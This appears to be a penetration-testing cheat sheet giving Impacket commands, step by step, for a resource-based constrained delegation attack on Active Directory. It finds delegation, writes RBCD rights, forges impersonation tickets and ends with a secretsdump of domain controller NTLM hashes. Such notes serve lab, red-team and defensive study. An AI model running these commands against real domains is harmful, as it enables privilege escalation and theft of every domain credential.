---
title: "Constrained Delegation"
date: 2024-8-2
tags: ["Credential Dumping", "Impacket", "Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Constrained Delegation", "Active Driectory", "Windows", "RBCD"]
---

### Abuse #1: RBCD Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Find delegation

```console
# Check delegation
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k
```

#### 2. Get a service ticket

```console
impacket-getST -spn <SERVICE>/<TARGET_DOMAIN> -impersonate administrator '<DOMAIN>/<USER>' -hashes :<HASH> -self
```

```console
# Check forwardable flag
describeTicket.py <TICKET_1>.ccache
```

#### 3. RBCD Attack

```console
# Add delegation
impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -delegate-from <USER> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps
```

```console
# Check
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -dc-ip <DC> -hashes :<HASH> -k
```

#### 4. Get a service ticket

```console
# Impersonate
impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -spn <SERVICE>/<TARGET_DOMAIN> -impersonate <TARGET_2>
```

```console
# Check forwardable flag
describeTicket.py <TICKET_2>.ccache
```

#### 5. Impersonate

```console
impacket-getST -spn <SERVICE>/<TARGET_DOMAIN> -impersonate <TARGET_2> '<DOMAIN>/<TARGET_1>' -hashes :<HASH> -additional-ticket <TICKET_2>.ccache
```

#### 4. Secrets Dump

```console
export KRB5CCNAME='<TICKET_2>.ccache'
```

```console
impacket-secretsdump -no-pass -k <DC> -just-dc-ntlm
```

{{< /tabcontent >}}
